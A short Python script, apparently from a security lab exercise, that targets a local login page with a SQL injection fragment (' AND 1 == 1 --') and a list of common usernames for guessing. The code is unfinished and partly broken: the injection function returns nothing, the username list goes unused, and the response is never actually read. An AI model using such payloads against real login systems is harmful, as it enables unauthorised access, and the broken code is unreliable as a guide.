#!/usr/bin/env python3

import urllib.parse as urlp
import urllib.request as urlr


def inject_bypass(user):
    user = user + " AND 1 == 1 --"


usernames = {
    "root",
    "test",
    "oracle",
    "admin",
    "info",
    "user",
    "postgres",
    "mysql",
    "backup",
    "guest",
    "web",
    "tomcat",
    "michael",
    "r00t",
    "upload",
    "alex",
    "sales",
    "linux",
    "bin",
    "ftp",
    "support",
    "temp",
    "nagios",
    "user1",
    "www",
    "test1",
    "nobody"
}


url = "http://localhost/lab09/login.php"

params = {
    "u": "test",
    "p": "pass"
}

query = urlp.urlencode(params)
url = url + "?" + query

with urlr.urlopen(url) as response:
    response_text = response.read
    print(response_text)
